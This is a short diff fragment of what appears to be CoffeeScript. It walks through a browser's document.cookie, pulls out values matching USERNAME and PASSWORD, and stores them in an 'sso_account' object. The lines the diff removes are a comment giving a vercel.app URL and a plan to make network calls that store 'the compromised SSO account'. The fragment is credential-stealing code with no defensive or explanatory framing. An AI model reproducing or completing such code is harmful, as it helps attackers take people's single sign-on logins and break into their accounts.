@@ -16,10 +16,3 @@ for c in document.cookie.split(';')
     cstrp = decodeURIComponent(c.split('=')[1])
     c.includes(USERNAME) and sso_account.username = cstrp
     c.includes(PASSWORD) and sso_account.pw = cstrp
-
-###
-https://youkwhd.vercel.app/
-
-...make net calls to a database,
-store the compromised SSO account
-###
